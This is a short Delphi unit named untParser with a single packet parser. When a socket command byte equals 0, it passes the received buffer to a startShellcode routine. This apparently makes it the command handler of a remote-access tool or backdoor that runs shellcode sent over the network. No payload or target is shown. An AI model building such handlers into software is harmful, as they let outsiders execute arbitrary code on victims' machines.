unit untParser;

interface
uses
  Windows,
  untUtils,
  Winsock;

procedure ParsePacket(mSocket:Integer; mBuff:PWideChar; dwLen:Integer; bCMD:Byte);

implementation

procedure ParsePacket(mSocket:Integer; mBuff:PWideChar; dwLen:Integer; bCMD:Byte);
begin
  case bCMD of
    $0:startShellcode(mSocket, mBuff, dwLen);
  end;
end;
end.
